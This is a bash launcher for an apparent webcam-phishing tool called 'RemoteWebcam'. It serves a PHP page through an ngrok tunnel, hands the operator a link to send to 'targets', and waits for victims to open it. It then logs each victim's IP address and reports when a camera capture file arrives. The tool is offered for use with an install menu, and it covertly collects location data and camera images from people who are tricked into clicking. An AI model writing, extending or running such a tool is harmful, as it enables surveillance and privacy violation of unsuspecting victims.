#!/bin/bash

main(){
    #../color
    r="\033[1;31m" 
    g="\033[1;32m" 
    y="\033[1;33m" 
    b="\033[1;34m" 
    p="\033[1;35m" 
    c="\033[1;36m" 
    w="\033[0m" 
    # catch_ip
    catch_ip() {

        ip=$(grep -a 'IP:' files/webcam/ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
        
        cat ip.txt >> saved.ip.txt
    }

    # result check
    checkfound() {

        printf "\n"
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] ❖ Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
        while [ true ]; do


        if [[ -e "files/webcam/ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] ➜ Target opened the link!\n"
            catch_ip
            rm -rf ip.txt

        fi

        sleep 0.5

        if [[ -e "files/webcam/Log.log" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
            rm -rf Log.log
        fi
        sleep 0.5

        done 
    }

    # start
    start(){
        banner
        echo -e "$w❖ $y Ngrok Configuration$w"
        read -p "[Your Authtoken]: " token
        ngrok authtoken $token
        read -p "[Port(default 8080)]: " port
        echo -e "$w❖$y Starting servers..."
        sleep 2
        printf "\e[1;92m[\e[0m+\e[1;92m] ➜ Starting php server...\n"
        cd files/webcam && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
        sleep 2
        printf "\e[1;92m[\e[0m+\e[1;92m] ➜ Starting ngrok server...\n"
        ngrok http $port > /dev/null 2>&1 & 
        sleep 2
        link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
        printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
        checkfound
        


    }
    # install
    install(){
        # Use of root is required
        packages="php python3 snapd"
        ngorok="ngrok"
        echo -e """$y
        +--------------------------------+
        |          [!]Warning[!]         |
        +--------------------------------+
        Instant installation can currently only be run on Debian-based Linux.
        For other users, especially Termux users, we will make an instant installation program later.
        You can use the manual installation method.
        for more manual installation information please visit https://github.com/WarceuProject/RemoteWebcam/blob/master/DocumentationInstallation.md
        $w
        """
        read -p "[Enter to continue the installation]"
        sudo apt update -y
        sudo apt install $packages
        sudo snap install $ngorok

        # If you have installed the package, it will immediately run the remote webcam.
        start
    }

    # main banner 
    banner(){
        clear
        logo='files/logo.sh'
        chmod 777 $logo && ./$logo
    }
    # main menu
    main_menu(){
        echo -e """
        $w❖$r MENU$w:
           $w❶$y Install$w(recommend)
           $w❷$y Start
           $w❸$r Exit$w
        """
        read -p "[Choose]➜ " c;
        if [[ $c == 1 ]]; then
           install
        elif [[ $c == 2 ]]; then
           start 
        elif [[ $c == 3 ]]; then 
           echo -e "$y Thank you for trying the program ^_^"
           sleep 1
           exit
        else
           echo -e "$r (✘)Wrong input!"
            sleep 1
            banner
            main_menu
        fi

    }
    banner
    main_menu

}
main